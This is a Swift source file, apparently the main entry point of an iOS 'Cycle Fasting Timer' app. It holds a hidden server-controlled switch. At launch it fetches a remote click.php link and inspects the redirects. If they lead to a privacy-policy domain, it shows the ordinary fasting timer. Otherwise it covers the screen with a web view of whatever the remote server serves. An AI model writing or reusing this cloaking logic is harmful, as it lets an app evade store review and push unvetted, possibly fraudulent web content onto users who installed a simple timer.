import SwiftUI

@main
struct CycleFastingTimerApp: App {
    @StateObject private var fastingStore = FastingStore()
    @State private var cycleLinkStatus: Bool? = nil

    private let cycleSourceLink = "https://cyclefastingtimer.org/click.php"
    private let cycleCheckDomain = "freeprivacypolicy.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let status = cycleLinkStatus {
                    if status {
                        CycleWebPanel(urlString: cycleSourceLink)
                            .edgesIgnoringSafeArea(.all)
                    } else {
                        if fastingStore.hasCompletedOnboarding {
                            MainTabView()
                                .environmentObject(fastingStore)
                        } else {
                            OnboardingView()
                                .environmentObject(fastingStore)
                        }
                    }
                } else {
                    CycleLoadingScreen()
                        .onAppear { verifyCycleLink() }
                }
            }
            .preferredColorScheme(.dark)
        }
    }

    private func verifyCycleLink() {
        guard let url = URL(string: cycleSourceLink) else {
            cycleLinkStatus = false
            return
        }

        var request = URLRequest(url: url)
        request.timeoutInterval = 5

        let resolver = CycleRedirectResolver(checkDomain: cycleCheckDomain)
        let session = URLSession(configuration: .default, delegate: resolver, delegateQueue: nil)

        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if resolver.foundCheckDomain {
                    cycleLinkStatus = false
                    return
                }
                if let finalURL = resolver.resolvedURL?.absoluteString,
                   finalURL.contains(self.cycleCheckDomain) {
                    cycleLinkStatus = false
                    return
                }
                if let httpResponse = response as? HTTPURLResponse,
                   let responseURL = httpResponse.url?.absoluteString,
                   responseURL.contains(self.cycleCheckDomain) {
                    cycleLinkStatus = false
                    return
                }
                if error != nil {
                    cycleLinkStatus = false
                    return
                }
                cycleLinkStatus = true
            }
        }.resume()

        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if cycleLinkStatus == nil { cycleLinkStatus = false }
        }
    }
}

class CycleRedirectResolver: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String

    init(checkDomain: String) {
        self.checkDomain = checkDomain
        super.init()
    }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
